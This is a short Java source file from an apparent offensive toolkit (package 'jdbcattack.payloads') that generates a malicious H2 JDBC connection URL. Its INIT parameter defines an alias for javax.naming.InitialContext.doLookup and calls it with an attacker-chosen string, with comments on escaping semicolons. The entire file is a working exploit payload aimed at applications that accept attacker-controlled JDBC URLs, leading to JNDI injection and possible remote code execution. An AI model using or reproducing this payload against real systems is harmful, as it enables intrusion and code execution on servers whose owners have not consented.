package cn.butler.jdbcattack.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.utils.StringUtils;

public class H2StaticMethod implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String randStr = StringUtils.getRandStr(3);
        //H2静态方法声明中必须要用双引号
        String INITParameter = String.format("DROP ALIAS IF EXISTS %s;CREATE ALIAS %s FOR \"javax.naming.InitialContext.doLookup(java.lang.String)\";CALL %s('%s');",randStr,randStr,randStr,command);
        //转义分号: 因为在H2的连接串中分号是SQL语句分隔符,所以INIT配置参数中所有的分号都要设置转义
        INITParameter = INITParameter.replace(";", "\\;"); // 替换反斜杠
        String createStaticMethodTemplate = "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=" + INITParameter;
        return createStaticMethodTemplate;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(H2StaticMethod.class, args);
    }
}
